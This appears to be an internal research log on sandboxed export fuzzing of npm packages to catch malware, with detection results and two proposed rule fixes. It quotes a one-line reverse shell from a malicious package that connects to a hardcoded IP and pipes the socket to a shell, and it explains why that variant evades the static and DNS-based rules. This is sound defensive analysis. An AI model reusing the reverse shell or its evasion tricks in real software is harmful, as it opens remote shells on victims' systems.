# Export fuzzing: a modest lift, and two rule gaps it surfaced (2026-07-24)

Tested the hypothesis that the behavioral tier's misses are **function-gated** payloads
— malicious code behind an exported function that plain `require()` defines but never
calls — and that **invoking the exports** would make them fire. Patched the npm import
harness to enumerate a required module's exports and call them (several arg shapes + as
constructor, bounded to 500 calls), then detonated a 205-package npm batch behind the
recording sinkhole and re-scored each trace.

**Verdict: the hypothesis was partly right but modest. Export fuzzing recovered 1 of the
10 residual misses. The residual is dominated by rule gaps, not function-gating.**

## Numbers

- **205 npm detonated** (serial — see throughput note), 195 with usable traces.
- **165 caught (85%)**, 30 allow, 10 NO_TRACE.
- **Residual lift: 1/10.** Of the 10 packages that static+behavioral both missed the
  night before, exactly one now catches with fuzzing: `whatsapp-core-auth-drzak`
  (quarantine via `unknown-domain` — it beacons to a *domain* C2, so once fuzzing invoked
  its export the DNS lookup fired and the rule saw it).
- 74 catches had `fuzz>0` (exports were invoked during their run), but that is **not** a
  fuzzing-attribution — nearly all of those fire at install/postinstall regardless. The
  honest attribution is the residual comparison above: **1**.

## Why the other 9 residual still miss — and it isn't fuzzing

Dissecting them gives a sharper result than a fuzzing win would have:

- **Raw-IP reverse shells** (`elf-stats-*`). `elf-stats-midnight-mitten-226` is an IIFE
  reverse shell — `(function(){ net.connect(9000,"161.97.148.123").pipe(sh) })()` — that
  runs on require, so fuzzing is irrelevant (nothing gated to unlock). It missed for two
  **rule** reasons, and the sinkhole **captured the connection** either way:
  1. **Static** `reverse-shell-source` requires `dup2`-style fd binding; this variant
     wires the socket to the shell with `.pipe()`, which the rule does not match.
  2. **Behavioral** egress detection is DNS/domain-shaped (`unknown-domain`), so a
     hardcoded **raw-IP** connect-back is invisible — the egress happened and we logged
     it at the sink, but the rule was the wrong shape to see it.
- **Heavily fuzzed but inert** — `plugin-vue` had 5 exports invoked and nothing fired;
  likely a benign-name squat or gated on a live C2 response the sink can't fake.
- **`fuzz=0`** (`psalm`, `mailconfirmer`, `rca-overlay-panel`) — require failed or there
  were no callable exports, so there was nothing to invoke.

## The two fixes this surfaced (higher-value than the fuzzing itself)

1. **Static: `.pipe()`-based reverse shells.** Extend `reverse-shell-source` Tier-B
   beyond `dup2` to cover socket→shell wiring via `.pipe()`/stream piping.
2. **Behavioral: raw-IP egress.** `unknown-domain` only sees DNS lookups; add a rule for
   a connect-back to a hardcoded public IP with no prior resolution. The trace and the
   sinkhole both have the data; the tier just doesn't rule on it.

Both are testable against the **saved corpus** (195 traces + 206 logs,
`eval-captures/2026-07-24-export-fuzzing-corpus.tgz`, gitignored) — offline, no
re-detonation.

## Honest limits

- **Serial only.** Concurrent detonation hit an `error creating container: exit status
  125` race on the shared gVisor runtime root (~33% loss at 2–4 workers), so throughput
  was capped at ~1.7 min/sample. Fixing that (per-worker runsc root) is the way to a
  1000-sample corpus.
- **Sinkhole returns garbage to C2.** A payload that fetches-then-runs its real second
  stage stalls, so "fuzzing didn't help" and "needed a live C2" are indistinguishable in
  these traces for some samples. The raw-IP finding is not affected by this — that
  connection is the payload, not a fetch.
- **npm only.** pypi stays dep-undercounted (broken sinkhole registry allowlist).
- **Export fuzzing is aggressive by design** — it calls arbitrary exports with dummy
  args and as constructors. Contained in the sandbox; not for anything but analysis.

## Next

1. Build the two rule fixes and validate against the saved corpus.
2. Then the Codex panel over the residual, judging **traces + source** — the layer that
   could read `elf-stats`'s reverse shell as malicious where the rules' shapes miss it.
   (Parked pending the go-ahead; it spends tokens.)
